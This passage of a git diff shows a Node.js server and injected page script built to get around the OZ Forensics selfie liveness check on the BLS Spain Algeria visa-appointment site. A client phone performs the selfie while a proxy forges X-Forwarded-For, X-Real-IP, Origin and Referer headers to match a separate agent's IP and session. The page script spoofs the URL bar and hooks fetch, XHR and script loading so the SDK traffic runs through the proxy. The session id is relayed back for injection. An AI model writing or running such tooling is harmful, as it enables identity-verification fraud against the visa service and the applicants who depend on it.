@@ -1,18 +1,27 @@
 /**
- * DZ34SNI Server v3.0 — with OZ Reverse Proxy
+ * DZ34SNI Server v3.0 — WITH OZ PROXY
+ * Deploy on Render: https://dz34sni-26.onrender.com
+ * 
+ * NEW: /oz-proxy/* endpoint that proxies ALL requests to ozforensics.com
+ * and injects the Agent's real IP as X-Forwarded-For.
+ * This way, OZ sees the Agent's IP, not the Client's phone IP.
  * 
  * Flow:
- * 1. Agent captures userId + transactionId + realIp → POST /task/:phone
- * 2. APK polls GET /task/:phone → receives task
- * 3. APK loads /oz-page → page loads OZ SDK via /oz-proxy/
- * 4. ALL ozforensics requests go through /oz-proxy/ with Agent's IP
- * 5. APK POSTs result to /result/:phone
- * 6. Agent polls GET /result/:phone → injects session_id
+ * 1. Extension (agent) captures userId + transactionId from BLS liveness page
+ * 2. Extension POSTs task to /task/:phone (includes agent's realIp)
+ * 3. APK (client) polls GET /task/:phone → receives task
+ * 4. APK navigates to GET /oz-page → loads OZ SDK through our proxy
+ * 5. ALL OZ SDK requests (JS, API, video upload) go through /oz-proxy/*
+ * 6. Server proxies to ozforensics.com with X-Forwarded-For = agent IP
+ * 7. APK POSTs result to /result/:phone
+ * 8. Extension polls GET /result/:phone → gets event_session_id → injects
  */
 
 const express = require('express');
 const cors = require('cors');
-const fetch = require('node-fetch');
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
@@ -20,55 +29,61 @@ const PORT = process.env.PORT || 3000;
 // MIDDLEWARE
 // ═══════════════════════════════════════════
 app.use(cors());
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 
-// Parse JSON for normal routes, but NOT for /oz-proxy (needs raw body)
-app.use((req, res, next) => {
-    if (req.path.startsWith('/oz-proxy/')) {
-        // Collect raw body for proxy forwarding
-        const chunks = [];
-        req.on('data', chunk => chunks.push(chunk));
-        req.on('end', () => {
-            req.rawBody = Buffer.concat(chunks);
-            next();
-        });
-    } else {
-        express.json({ limit: '10mb' })(req, res, next);
-    }
-});
-app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+// Increase raw body for proxy
+app.use('/oz-proxy', express.raw({ type: '*/*', limit: '50mb' }));
 
+// Request logging
 app.use((req, res, next) => {
     const ts = new Date().toISOString().substring(11, 19);
-    if (!req.path.startsWith('/oz-proxy/')) {
-        console.log(`[${ts}] ${req.method} ${req.path}`);
-    }
+    const path = req.path.length > 80 ? req.path.substring(0, 80) + '...' : req.path;
+    console.log(`[${ts}] ${req.method} ${path}`);
     next();
 });
 
 // ═══════════════════════════════════════════
-// STORAGE
+// IN-MEMORY STORAGE
 // ═══════════════════════════════════════════
+// tasks[phone] = { userId, transactionId, realIp, cookies, userAgent, pageUrl, verificationToken, timestamp }
 const tasks = {};
+// results[phone] = { event_session_id, status, realIp, timestamp }
 const results = {};
-const phoneIpMap = {};
+// ipMap[phone] = agentIp — stores agent IP per phone for proxy use
+const ipMap = {};
 
+// Auto-cleanup: remove entries older than 30 minutes
 setInterval(() => {
     const now = Date.now();
-    const MAX = 30 * 60 * 1000;
-    for (const p in tasks) { if (now - (tasks[p].timestamp || 0) > MAX) { delete tasks[p]; delete phoneIpMap[p]; } }
-    for (const p in results) { if (now - (results[p].timestamp || 0) > MAX) { delete results[p]; } }
+    const MAX_AGE = 30 * 60 * 1000;
+    for (const phone in tasks) {
+        if (now - (tasks[phone].timestamp || 0) > MAX_AGE) {
+            delete tasks[phone];
+            delete ipMap[phone];
+            console.log(`[CLEANUP] Task removed: ${phone}`);
+        }
+    }
+    for (const phone in results) {
+        if (now - (results[phone].timestamp || 0) > MAX_AGE) {
+            delete results[phone];
+            console.log(`[CLEANUP] Result removed: ${phone}`);
+        }
+    }
 }, 5 * 60 * 1000);
 
 // ═══════════════════════════════════════════
-// TASK ROUTES
+// ROUTES: TASK (Extension → APK)
 // ═══════════════════════════════════════════
 
 app.post('/task/:phone', (req, res) => {
     const phone = req.params.phone;
     const body = req.body || {};
+    
     if (!body.userId || !body.transactionId) {
         return res.status(400).json({ ok: false, error: 'Missing userId or transactionId' });
     }
+
     tasks[phone] = {
         userId: body.userId,
         transactionId: body.transactionId,
@@ -79,7 +94,12 @@ app.post('/task/:phone', (req, res) => {
         verificationToken: body.verificationToken || '',
         timestamp: body.timestamp || Date.now()
     };
-    if (body.realIp) phoneIpMap[phone] = body.realIp;
+
+    // Store agent IP for proxy
+    if (body.realIp) {
+        ipMap[phone] = body.realIp;
+    }
+
     console.log(`[TASK] 📥 ${phone}: userId=${body.userId.substring(0, 20)}... realIp=${body.realIp || 'none'}`);
     res.json({ ok: true });
 });
@@ -89,29 +109,33 @@ app.get('/task/:phone', (req, res) => {
     const task = tasks[phone];
     if (task) {
         console.log(`[TASK] 📤 ${phone}: sending task`);
-        res.json({ ok: true, task });
+        res.json({ ok: true, task: task });
     } else {
         res.json({ ok: false, task: null });
     }
 });
 
 // ═══════════════════════════════════════════
-// RESULT ROUTES
+// ROUTES: RESULT (APK → Extension)
 // ═══════════════════════════════════════════
 
 app.post('/result/:phone', (req, res) => {
     const phone = req.params.phone;
     const body = req.body || {};
+
     if (!body.event_session_id) {
         return res.status(400).json({ ok: false, error: 'Missing event_session_id' });
     }
+
     results[phone] = {
         event_session_id: body.event_session_id,
         status: body.status || 'completed',
-        realIp: body.realIp || '',
+        realIp: body.realIp || ipMap[phone] || '',
         timestamp: body.timestamp || Date.now()
     };
+
     delete tasks[phone];
+
     console.log(`[RESULT] ✅ ${phone}: session=${body.event_session_id.substring(0, 20)}...`);
     res.json({ ok: true });
 });
@@ -119,27 +143,148 @@ app.post('/result/:phone', (req, res) => {
 app.get('/result/:phone', (req, res) => {
     const phone = req.params.phone;
     const result = results[phone];
-    if (result) res.json({ ok: true, result });
-    else res.json({ ok: false, result: null });
+    if (result) {
+        console.log(`[RESULT] 📤 ${phone}: sending result`);
+        res.json({ ok: true, result: result });
+    } else {
+        res.json({ ok: false, result: null });
+    }
 });
 
 // ═══════════════════════════════════════════
-// CLEANUP
+// ROUTES: CLEANUP
 // ═══════════════════════════════════════════
 
 app.delete('/clear/:phone', (req, res) => {
     const phone = req.params.phone;
-    delete tasks[phone]; delete results[phone]; delete phoneIpMap[phone];
+    delete tasks[phone];
+    delete results[phone];
+    delete ipMap[phone];
     console.log(`[CLEAR] 🗑️ ${phone}`);
     res.json({ ok: true });
 });
 
 // ═══════════════════════════════════════════
-// OZ REVERSE PROXY
+// OZ PROXY — THE KEY FEATURE
 // ═══════════════════════════════════════════
+/**
+ * /oz-proxy/:phone/* 
+ * 
+ * Proxies ANY request to ozforensics.com domains.
+ * Adds X-Forwarded-For header with the agent's IP (stored in ipMap[phone]).
+ * 
+ * Example:
+ *   GET /oz-proxy/0555123456/web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php
+ *   → GET https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php
+ *     with X-Forwarded-For: <agent_ip>
+ */
+app.all('/oz-proxy/:phone/*', (req, res) => {
+    const phone = req.params.phone;
+    const agentIp = ipMap[phone] || '';
+    
+    // Extract the target URL from the path after /oz-proxy/:phone/
+    // The path looks like: /oz-proxy/PHONE/hostname/path/to/resource
+    const afterPrefix = req.params[0]; // everything after /oz-proxy/:phone/
+    
+    if (!afterPrefix) {
+        return res.status(400).json({ ok: false, error: 'Missing target URL' });
+    }
+    
+    // Reconstruct the full target URL
+    // afterPrefix = "web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"
+    const targetUrl = 'https://' + afterPrefix + (req._parsedUrl.search || '');
+    
+    console.log(`[OZ-PROXY] ${req.method} → ${targetUrl.substring(0, 100)} (IP: ${agentIp || 'none'})`);
+    
+    // Security: only allow ozforensics.com domains
+    let parsedUrl;
+    try {
+        parsedUrl = new URL(targetUrl);
+    } catch(e) {
+        return res.status(400).json({ ok: false, error: 'Invalid URL' });
+    }
+    
+    if (!parsedUrl.hostname.includes('ozforensics.com')) {
+        return res.status(403).json({ ok: false, error: 'Only ozforensics.com domains allowed' });
+    }
+    
+    // Build proxy request headers
+    const proxyHeaders = {};
+    
+    // Copy relevant headers from client request
+    const copyHeaders = ['content-type', 'accept', 'accept-language', 'accept-encoding'];
+    for (const h of copyHeaders) {
+        if (req.headers[h]) proxyHeaders[h] = req.headers[h];
+    }
+    
+    // Set the critical headers
+    proxyHeaders['Host'] = parsedUrl.hostname;
+    proxyHeaders['Origin'] = 'https://algeria.blsspainglobal.com';
+    proxyHeaders['Referer'] = 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest';
+    proxyHeaders['User-Agent'] = req.headers['user-agent'] || 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0';
+    
+    // THE KEY: Set X-Forwarded-For to agent's IP
+    if (agentIp) {
+        proxyHeaders['X-Forwarded-For'] = agentIp;
+        proxyHeaders['X-Real-IP'] = agentIp;
+    }
+    
+    const options = {
+        hostname: parsedUrl.hostname,
+        port: 443,
+        path: parsedUrl.pathname + parsedUrl.search,
+        method: req.method,
+        headers: proxyHeaders,
+        timeout: 60000
+    };
+    
+    const proxyReq = https.request(options, (proxyRes) => {
+        // Copy response headers (except some problematic ones)
+        const skipHeaders = ['transfer-encoding', 'content-encoding', 'connection', 'keep-alive'];
+        for (const [key, value] of Object.entries(proxyRes.headers)) {
+            if (!skipHeaders.includes(key.toLowerCase())) {
+                // Fix CORS - allow our server
+                if (key.toLowerCase() === 'access-control-allow-origin') {
+                    res.setHeader(key, '*');
+                } else {
+                    res.setHeader(key, value);
+                }
+            }
+        }
+        
+        // Always set CORS headers
+        res.setHeader('Access-Control-Allow-Origin', '*');
+        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+        res.setHeader('Access-Control-Allow-Headers', '*');
+        
+        res.status(proxyRes.statusCode);
+        proxyRes.pipe(res);
+    });
+    
+    proxyReq.on('error', (err) => {
+        console.error(`[OZ-PROXY] Error: ${err.message}`);
+        res.status(502).json({ ok: false, error: 'Proxy error: ' + err.message });
+    });
+    
+    proxyReq.on('timeout', () => {
+        proxyReq.destroy();
+        res.status(504).json({ ok: false, error: 'Proxy timeout' });
+    });
+    
+    // Forward request body
+    if (req.method !== 'GET' && req.method !== 'HEAD') {
+        if (Buffer.isBuffer(req.body)) {
+            proxyReq.write(req.body);
+        } else if (req.body && typeof req.body === 'object') {
+            proxyReq.write(JSON.stringify(req.body));
+        }
+    }
+    
+    proxyReq.end();
+});
 
-// CORS preflight
-app.options('/oz-proxy/*', (req, res) => {
+// Handle CORS preflight for proxy
+app.options('/oz-proxy/:phone/*', (req, res) => {
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', '*');
@@ -147,344 +292,248 @@ app.options('/oz-proxy/*', (req, res) => {
     res.status(204).end();
 });
 
-app.all('/oz-proxy/:phone/*', async (req, res) => {
-    const phone = req.params.phone;
-    const realIp = phoneIpMap[phone] || '';
-    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip.onrender.com';
-    const proxyBase = `${serverUrl}/oz-proxy/${encodeURIComponent(phone)}/`;
-    
-    // Build target URL
-    const targetPath = req.params[0] || '';
-    // Remove any query string that Express might have parsed
-    const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
-    const targetUrl = 'https://' + targetPath + qs;
-    
-    console.log(`[OZ-PROXY] ${req.method} → ${targetUrl.substring(0, 100)} (IP: ${realIp})`);
-
-    try {
-        // Build proxy headers
-        const proxyHeaders = {};
-        const fwd = ['accept', 'accept-language', 'content-type', 'cache-control', 'pragma',
-                      'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform',
-                      'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site'];
-        for (const h of fwd) {
-            if (req.headers[h]) proxyHeaders[h] = req.headers[h];
-        }
-
-        proxyHeaders['User-Agent'] = 'Mozilla/5.0 (Android 13; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0';
-        proxyHeaders['Referer'] = 'https://algeria.blsspainglobal.com/dza/appointment/LivenessRequest';
-        proxyHeaders['Origin'] = 'https://algeria.blsspainglobal.com';
-        
-        if (realIp) {
-            proxyHeaders['X-Forwarded-For'] = realIp;
-            proxyHeaders['X-Real-IP'] = realIp;
-        }
-
-        const fetchOpts = {
-            method: req.method,
-            headers: proxyHeaders,
-            redirect: 'follow',
-            timeout: 60000
-        };
-
-        // Forward body for POST/PUT/PATCH
-        if (['POST', 'PUT', 'PATCH'].includes(req.method) && req.rawBody && req.rawBody.length > 0) {
-            fetchOpts.body = req.rawBody;
-            if (req.headers['content-length']) {
-                proxyHeaders['content-length'] = String(req.rawBody.length);
-            }
-        }
-
-        const proxyRes = await fetch(targetUrl, fetchOpts);
-        
-        // Get content type to decide if we need to rewrite URLs in response
-        const contentType = proxyRes.headers.get('content-type') || '';
-        const isTextContent = contentType.includes('text/') || 
-                              contentType.includes('javascript') || 
-                              contentType.includes('json') ||
-                              contentType.includes('xml');
-
-        // Forward response headers
-        const skip = new Set(['transfer-encoding', 'connection', 'keep-alive', 'content-encoding', 'content-length']);
-        proxyRes.headers.forEach((value, name) => {
-            if (!skip.has(name.toLowerCase())) {
-                res.setHeader(name, value);
-            }
-        });
-
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-        res.setHeader('Access-Control-Allow-Headers', '*');
-
-        let body = await proxyRes.buffer();
-
-        // For text content (JS, HTML, CSS), rewrite ozforensics.com URLs to go through proxy
-        if (isTextContent && body.length > 0) {
-            let text = body.toString('utf-8');
-            
-            // Rewrite all https://xxx.ozforensics.com URLs to proxy
-            text = text.replace(/https?:\/\/([a-z0-9\-\.]*ozforensics\.com)/gi, (match, domain) => {
-                return proxyBase + domain;
-            });
-            
-            body = Buffer.from(text, 'utf-8');
-        }
-
-        res.status(proxyRes.status);
-        res.setHeader('Content-Length', body.length);
-        res.send(body);
-
-        console.log(`[OZ-PROXY] ← ${proxyRes.status} ${contentType.substring(0, 30)} (${body.length}b)`);
-
-    } catch (err) {
-        console.error(`[OZ-PROXY] ERROR: ${err.message}`);
-        res.status(502).json({ error: 'Proxy error', message: err.message });
-    }
-});
-
 // ═══════════════════════════════════════════
-// OZ-PAGE
+// ROUTE: OZ-PAGE (with proxy rewriting)
 // ═══════════════════════════════════════════
 
 app.get('/oz-page', (req, res) => {
     const { userId, transactionId, realIp, phone } = req.query;
     
-    const esc = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
-    const uid = esc(userId);
-    const tid = esc(transactionId);
-    const ip = esc(realIp);
-    const ph = esc(phone);
-
-    if (phone && realIp) phoneIpMap[phone] = realIp;
-
-    const serverUrl = process.env.RENDER_EXTERNAL_URL || 'https://dz34sni-serveravecip.onrender.com';
-    const proxyBase = `${serverUrl}/oz-proxy/${encodeURIComponent(phone || '')}`;
+    const escJs = (s) => (s || '').replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/</g, '\\x3c').replace(/>/g, '\\x3e');
+    const uid = escJs(userId);
+    const tid = escJs(transactionId);
+    const ip = escJs(realIp);
+    const ph = escJs(phone);
+    // Server base URL (auto-detect from request)
+    const proto = req.headers['x-forwarded-proto'] || req.protocol || 'https';
+    const host = req.headers['host'] || 'dz34sni-26.onrender.com';
+    const serverBase = `${proto}://${host}`;
+    const proxyBase = `${serverBase}/oz-proxy/${encodeURIComponent(phone || '')}`;
 
     const html = `<!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>BLS Liveness</title>
+<title>BLS Liveness Check</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0f172a;font-family:system-ui,sans-serif;min-height:100vh}
-.ld{position:fixed;inset:0;z-index:9999;background:#0f172a;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff}
-.ld .logo{width:70px;height:70px;border-radius:50%;background:linear-gradient(135deg,#dc2626,#b91c1c);display:flex;align-items:center;justify-content:center;margin-bottom:16px;box-shadow:0 8px 32px rgba(220,38,38,.4)}
-.ld .logo span{font-size:32px;font-weight:900}
-.ld h2{font-size:18px;font-weight:700;margin-bottom:8px}
-.ld p{font-size:13px;color:#94a3b8}
-.ld-spin{width:40px;height:40px;border:4px solid rgba(255,255,255,.1);border-top-color:#0d9488;border-radius:50%;animation:sp .8s linear infinite;margin-top:20px}
-@keyframes sp{to{transform:rotate(360deg)}}
-#k2-ok{position:fixed;inset:0;z-index:2147483647;display:none;flex-direction:column;align-items:center;justify-content:center;background:linear-gradient(135deg,#059669,#0d9488,#0891b2);text-align:center;padding:30px}
-.chk{width:100px;height:100px;border-radius:50%;background:rgba(255,255,255,.2);display:flex;align-items:center;justify-content:center;margin-bottom:20px;animation:pop .5s ease-out}
-@keyframes pop{0%{transform:scale(0);opacity:0}70%{transform:scale(1.2)}100%{transform:scale(1);opacity:1}}
-.btn-ret{background:rgba(255,255,255,.2);color:#fff;border:2px solid rgba(255,255,255,.4);padding:14px 32px;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:16px}
-.ozliveness_logo,.ozliveness_version{display:none!important}
-#dbg{position:fixed;bottom:0;left:0;right:0;background:rgba(0,0,0,.8);color:#0f0;font:10px monospace;padding:4px 8px;z-index:99999;max-height:80px;overflow-y:auto;display:none}
+body { margin: 0; background: #fff; font-family: 'Segoe UI', Arial, sans-serif; }
+#st {
+    position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+    background: rgba(0,0,0,.85); color: #fff; padding: 12px 24px; border-radius: 10px;
+    font-size: 14px; z-index: 99999; text-align: center; font-weight: 600;
+    box-shadow: 0 4px 20px rgba(0,0,0,.3);
+}
 </style>
 </head>
 <body>
+<div id="oz-container"></div>
+<div id="st">Chargement SDK via proxy...</div>
 
-<div class="ld" id="ld">
-    <div class="logo"><span>D</span></div>
-    <h2 id="ld-text">Chargement du selfie...</h2>
-    <p>Preparez votre visage face a la camera</p>
-    <div class="ld-spin"></div>
-</div>
+<!-- URL bar spoof -->
+<script>
+try { history.replaceState({}, '', '/dza/appointment/LivenessRequest'); } catch(e) {}
+</script>
 
-<div id="k2-ok">
-    <div class="chk"><span style="font-size:50px;color:#fff">&#10003;</span></div>
-    <p style="font-size:28px;font-weight:900;color:#fff;margin-bottom:8px">SELFIE FAIT AVEC SUCCES</p>
-    <p style="font-size:16px;color:rgba(255,255,255,.8);margin-bottom:6px">\u062a\u0645 \u0627\u0644\u062a\u0642\u0627\u0637 \u0627\u0644\u0633\u064a\u0644\u0641\u064a \u0628\u0646\u062c\u0627\u062d</p>
-    <p style="font-size:15px;color:rgba(255,255,255,.9);font-weight:700;margin-bottom:10px">
-        Retour dans <span id="k2-c" style="background:rgba(255,255,255,.2);padding:4px 14px;border-radius:8px;font-size:22px">10</span>s
-    </p>
-    <button class="btn-ret" onclick="goBack()">RETOUR PAGE PRINCIPALE</button>
-</div>
-
-<div id="dbg"></div>
-
-<!-- Intercept ALL ozforensics URLs → route through server proxy -->
+<!-- ═══ CRITICAL: Intercept ALL fetch/XHR to route ozforensics.com through our proxy ═══ -->
 <script>
 (function(){
+    var PROXY_BASE = '${proxyBase}';
     var PHONE = '${ph}';
-    var PROXY_BASE = '${proxyBase}/';
+    var REAL_IP = '${ip}';
     
+    console.log('[DZ34SNI] Proxy base:', PROXY_BASE);
+    console.log('[DZ34SNI] Agent IP:', REAL_IP);
+    
+    // Helper: rewrite ozforensics URL to go through our proxy
     function rewriteUrl(url) {
         if (typeof url !== 'string') return url;
-        var m = url.match(/^https?:\\/\\/([a-z0-9\\-\\.]*ozforensics\\.com)(\\/.*)$/i);
-        if (m) return PROXY_BASE + m[1] + m[2];
+        
+        // Match any ozforensics.com URL
+        // https://something.ozforensics.com/path → PROXY_BASE/something.ozforensics.com/path
+        var match = url.match(/^https?:\\/\\/([^/]*ozforensics\\.com)(\\/.*)$/);
+        if (match) {
+            var newUrl = PROXY_BASE + '/' + match[1] + match[2];
+            console.log('[DZ34SNI-PROXY] Rewrite:', url.substring(0, 60), '→ proxy');
+            return newUrl;
+        }
         return url;
     }
     
-    // Override fetch
+    // ═══ Patch fetch ═══
     var _fetch = window.fetch;
     window.fetch = function(input, init) {
-        if (typeof input === 'string') {
-            var nw = rewriteUrl(input);
-            if (nw !== input) { dbg('fetch: ' + input.substring(0,60) + ' → proxy'); input = nw; }
-        } else if (input && input.url) {
-            var nw2 = rewriteUrl(input.url);
-            if (nw2 !== input.url) { input = new Request(nw2, input); }
+        var url = typeof input === 'string' ? input : (input && input.url ? input.url : '');
+        var newUrl = rewriteUrl(url);
+        
+        if (newUrl !== url) {
+            // If it was a Request object, recreate with new URL
+            if (typeof input !== 'string' && input instanceof Request) {
+                input = new Request(newUrl, input);
+            } else {
+                input = newUrl;
+            }
         }
+        
         return _fetch.call(this, input, init);
     };
     
-    // Override XMLHttpRequest
-    var _xo = XMLHttpRequest.prototype.open;
+    // ═══ Patch XMLHttpRequest ═══
+    var _xhrOpen = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url) {
-        var nw = rewriteUrl(url);
-        if (nw !== url) dbg('xhr: ' + url.substring(0,60) + ' → proxy');
-        arguments[1] = nw;
-        return _xo.apply(this, arguments);
+        var newUrl = rewriteUrl(url);
+        arguments[1] = newUrl;
+        return _xhrOpen.apply(this, arguments);
     };
     
-    // Override dynamic script creation
-    var _ce = document.createElement.bind(document);
+    // ═══ Patch createElement for script tags ═══
+    var _createElement = document.createElement.bind(document);
     document.createElement = function(tag) {
-        var el = _ce(tag);
+        var el = _createElement(tag);
         if (tag.toLowerCase() === 'script') {
-            var pd = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
-            if (pd && pd.set) {
+            var _srcDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src') || 
+                           Object.getOwnPropertyDescriptor(el.__proto__, 'src');
+            if (_srcDesc && _srcDesc.set) {
                 Object.defineProperty(el, 'src', {
-                    set: function(v) { pd.set.call(this, rewriteUrl(v)); },
-                    get: function() { return pd.get.call(this); },
-                    configurable: true
+                    get: function() { return _srcDesc.get.call(this); },
+                    set: function(val) {
+                        var newVal = rewriteUrl(val);
+                        return _srcDesc.set.call(this, newVal);
+                    },
+                    configurable: true,
+                    enumerable: true
                 });
             }
         }
         if (tag.toLowerCase() === 'link') {
-            var pd2 = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href');
-            if (pd2 && pd2.set) {
+            var _hrefDesc = Object.getOwnPropertyDescriptor(HTMLLinkElement.prototype, 'href') ||
+                            Object.getOwnPropertyDescriptor(el.__proto__, 'href');
+            if (_hrefDesc && _hrefDesc.set) {
                 Object.defineProperty(el, 'href', {
-                    set: function(v) { pd2.set.call(this, rewriteUrl(v)); },
-                    get: function() { return pd2.get.call(this); },
-                    configurable: true
+                    get: function() { return _hrefDesc.get.call(this); },
+                    set: function(val) {
+                        var newVal = rewriteUrl(val);
+                        return _hrefDesc.set.call(this, newVal);
+                    },
+                    configurable: true,
+                    enumerable: true
                 });
             }
         }
         return el;
     };
     
-    // Override Image
-    var _Img = window.Image;
+    // ═══ Patch Image constructor for tracking pixels ═══
+    var _Image = window.Image;
     window.Image = function(w, h) {
-        var img = new _Img(w, h);
-        var pd = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
-        if (pd && pd.set) {
+        var img = new _Image(w, h);
+        var _srcDesc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');
+        if (_srcDesc && _srcDesc.set) {
             Object.defineProperty(img, 'src', {
-                set: function(v) { pd.set.call(this, rewriteUrl(v)); },
-                get: function() { return pd.get.call(this); },
-                configurable: true
+                get: function() { return _srcDesc.get.call(this); },
+                set: function(val) {
+                    return _srcDesc.set.call(this, rewriteUrl(val));
+                },
+                configurable: true,
+                enumerable: true
             });
         }
         return img;
     };
-
-    // Debug log
-    function dbg(m) {
-        console.log('[OZ-PROXY] ' + m);
-        var d = document.getElementById('dbg');
-        if (d) { d.style.display = 'block'; d.textContent += m + '\\n'; d.scrollTop = d.scrollHeight; }
-    }
+    window.Image.prototype = _Image.prototype;
     
-    dbg('Proxy intercept ready: ' + PROXY_BASE);
+    // ═══ Patch WebSocket if OZ uses it ═══
+    var _WebSocket = window.WebSocket;
+    window.WebSocket = function(url, protocols) {
+        // Can't proxy WebSocket through HTTP, but log it
+        console.log('[DZ34SNI] WebSocket:', url);
+        return new _WebSocket(url, protocols);
+    };
+    window.WebSocket.prototype = _WebSocket.prototype;
+    
+    console.log('[DZ34SNI] ✅ All network interceptors installed - routing through proxy');
 })();
 </script>
 
-<form id="formLiveness" method="post" action="/DZA/appointment/LivenessResponse">
+<!-- Form for compatibility -->
+<form id="formLiveness" method="post" action="/dza/appointment/LivenessResponse">
     <input type="hidden" name="event_session_id" id="event_session_id" value="">
     <input type="hidden" name="LivenessId" id="LivenessId" value="">
+    <input type="hidden" name="__RequestVerificationToken" value="">
 </form>
 
-<!-- Load OZ SDK DIRECTLY from CDN (SDK checks hostname, can't proxy it) -->
-<!-- API requests will be intercepted by fetch/XHR overrides and routed through proxy -->
-<script src="https://web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
+<!-- Load OZ SDK THROUGH PROXY -->
+<script src="${proxyBase}/web-sdk.prod.cdn.spain.ozforensics.com/blsinternational/plugin_liveness.php"></script>
 
 <!-- Launch liveness after SDK loads -->
 <script>
-var __phone = '${ph}';
-var __server = '${serverUrl}';
-var __realIp = '${ip}';
-var __sent = false;
-
-function goBack() {
-    try { __dz34sni_bridge.onGoHome(); } catch(e) {
-        window.history.back();
-    }
-}
-
-function showOK() {
-    var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
-    var ok = document.getElementById('k2-ok'); if (ok) ok.style.display = 'flex';
-    var c = document.getElementById('k2-c'), n = 10;
-    var t = setInterval(function() {
-        n--; if (c) c.textContent = String(n);
-        if (n <= 0) { clearInterval(t); goBack(); }
-    }, 1000);
-}
-
-function postResult(sid) {
-    if (__sent) return; __sent = true;
-    try { __dz34sni_bridge.onStatus('Envoi resultat...'); } catch(e) {}
-    var url = __server + '/result/' + encodeURIComponent(__phone);
-    var body = JSON.stringify({ event_session_id: sid, status: 'completed', realIp: __realIp, timestamp: Date.now() });
-    function go(n) {
-        fetch(url, { method: 'POST', headers: {'Content-Type':'application/json'}, body: body, cache: 'no-store' })
-            .then(function() { try { __dz34sni_bridge.onResult(sid); } catch(e) {} })
-            .catch(function() { if (n < 5) setTimeout(function() { go(n+1); }, 2000); });
-    }
-    go(0);
-}
-
-// Check if SDK loaded
-function checkAndLaunch() {
-    var ldText = document.getElementById('ld-text');
-    
-    if (typeof OzLiveness === 'undefined') {
-        if (ldText) ldText.textContent = 'SDK non charge - verifiez la connexion';
-        console.log('[DZ34SNI] OzLiveness undefined, retrying in 3s...');
-        setTimeout(checkAndLaunch, 3000);
-        return;
-    }
-    
-    if (ldText) ldText.textContent = 'Demarrage selfie...';
-    console.log('[DZ34SNI] OzLiveness found! Launching...');
-    try { __dz34sni_bridge.onStatus('Selfie en cours...'); } catch(e) {}
-
-    var ld = document.getElementById('ld'); if (ld) ld.style.display = 'none';
-    
-    try {
-        OzLiveness.open({
-            lang: 'en',
-            meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
-            overlay_options: false,
-            action: ['video_selfie_blank'],
-            result_mode: 'safe',
-            on_complete: function(r) {
-                var sid = r && r.event_session_id ? String(r.event_session_id) : '';
-                console.log('[DZ34SNI] OZ complete: ' + sid);
-                if (sid) {
-                    try { document.getElementById('LivenessId').value = sid; } catch(e) {}
-                    postResult(sid);
-                    showOK();
-                }
-            },
-            on_error: function(e) {
-                console.log('[DZ34SNI] OZ error: ' + JSON.stringify(e));
-                try { __dz34sni_bridge.onError('OZ:' + (e && e.message || JSON.stringify(e))); } catch(x) {}
-            }
-        });
-    } catch(e) {
-        console.log('[DZ34SNI] SDK error: ' + e.message);
-        try { __dz34sni_bridge.onError('SDK:' + e.message); } catch(x) {}
-    }
-}
-
-// Start after page loads
 window.addEventListener('load', function() {
-    setTimeout(checkAndLaunch, 2000);
+    document.getElementById('st').textContent = 'Lancement...';
+    setTimeout(function() {
+        try {
+            if (typeof OzLiveness === 'undefined') {
+                document.getElementById('st').textContent = 'SDK non chargé - verifiez proxy';
+                if (window.Android) window.Android.onSelfieError('SDK not loaded');
+                if (window.__dz34sni_bridge) window.__dz34sni_bridge.onError('SDK not loaded');
+                return;
+            }
+            document.getElementById('st').textContent = 'Démarrage selfie...';
+            OzLiveness.open({
+                lang: 'en',
+                meta: { 'user_id': '${uid}', 'transaction_id': '${tid}' },
+                overlay_options: false,
+                action: ['video_selfie_blank'],
+                result_mode: 'safe',
+                on_complete: function(r) {
+                    var sid = r && r.event_session_id ? String(r.event_session_id) : '';
+                    if (sid) {
+                        document.getElementById('st').textContent = '✅ Selfie OK! Envoi...';
+                        try { document.getElementById('event_session_id').value = sid; } catch(e) {}
+                        try { document.getElementById('LivenessId').value = sid; } catch(e) {}
+                        
+                        // Send result to server
+                        var PHONE = '${ph}';
+                        var SERVER = '${serverBase}';
